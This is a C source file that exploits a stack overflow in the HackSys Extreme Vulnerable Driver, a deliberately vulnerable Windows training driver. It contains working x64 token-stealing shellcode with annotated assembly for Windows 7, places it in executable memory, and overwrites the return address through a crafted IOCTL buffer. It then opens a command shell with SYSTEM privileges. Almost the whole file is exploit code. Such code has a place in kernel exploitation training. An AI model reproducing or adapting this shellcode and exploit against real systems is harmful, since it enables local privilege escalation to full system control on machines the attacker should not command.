#include <stdio.h>
#include <Windows.h>

#define IOCTL_STACKOVERFLOW 0x222003

void exploit(void) {

	char shellcode[] = 
"\x48\x31\xc0\x65\x48\x8b\x80\x88\x01\x00\x00\x48\x8b\x40\x70\x49\x89\xc0\x48\x8b\x80\x88\x01\x00\x00\x48\x2d\x88\x01\x00\x00\x48\x8b\x88\x80\x01\x00\x00\x48\x83\xf9\x04\x75\xe6\x4c\x8b\x88\x08\x02\x00\x00\x4d\x89\x88\x08\x02\x00\x00\x48\x83\xc4\x58\xc3";

//Win7 x64 Token Stealing Payload
/*
    " start:                             "
    " xor     rax,rax                   ;"
    " mov     rax, gs:[rax+0x188]       ;"  # Fetch _KTHREAD address through GS register
    " mov     rax, [rax+0x70]           ;"  # Obtain _EPROCESS address from _KTHREAD
    " mov     r8,rax                    ;"  # Copy unprivileged _EPROCESS address to R8
    " find:                              "
    " mov     rax, [rax+0x188]          ;"  # Go to next EPROCESS via ActiveProcessLinks.Flink
    " sub     rax,0x188                 ;"  # Go back to the beginning of _EPROCESS structure
    " mov     rcx, [rax+0x180]          ;"  # Copy UniqueProcessId to RCX   
    " cmp     rcx, 0x04                 ;"  # Compare UniqueProcessId with SYSTEM process one
    " jne     find                      ;"  # If we are not looking at SYSTEM process grab next _EPROCESS
    " patch:                             "
    " mov     r9,[rax+0x208]            ;"  # Copy SYSTEM process token address to R9
    " mov     [r8+0x208],r9             ;"  # Steal token by overwriting the unprivileged token's reference
    " add rsp, 0x58                     ;"
    " ret                               ;" */

	LPVOID Allocated_Memory = VirtualAlloc(NULL, 0x63, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!Allocated_Memory) {
		printf("[-] Error Allocating the Shellcode Buffer\n");
		exit(1);
	}

	RtlMoveMemory(Allocated_Memory, shellcode, sizeof(shellcode));
	printf("[+] RWX Memory allocated at the Following Address: %p\n", Allocated_Memory);


	HANDLE driverHandle;
	DWORD bytesRet;
	char exploit[2064];
	const size_t offset = 2056;
	printf("[*] Opening handle to \\\\.\\HackSysExtremeVulnerableDriver\n");
	driverHandle = CreateFileA(
		"\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (driverHandle == INVALID_HANDLE_VALUE) {
		printf("Could Not Get Handle!");
		return;
	}


	printf("[*] File Created\n");
	memset(exploit, 'A', offset);
	memcpy(&exploit[offset], &Allocated_Memory, 0x8);
	DeviceIoControl(driverHandle, IOCTL_STACKOVERFLOW, exploit, sizeof(exploit), NULL, 0, &bytesRet, NULL);
	printf("[*] IOCTL Sent\n");
	CloseHandle(driverHandle);
	printf("[*] Closing Handle\n");

	system("cmd.exe");
}


int main(){
	exploit();
	return 0;
}
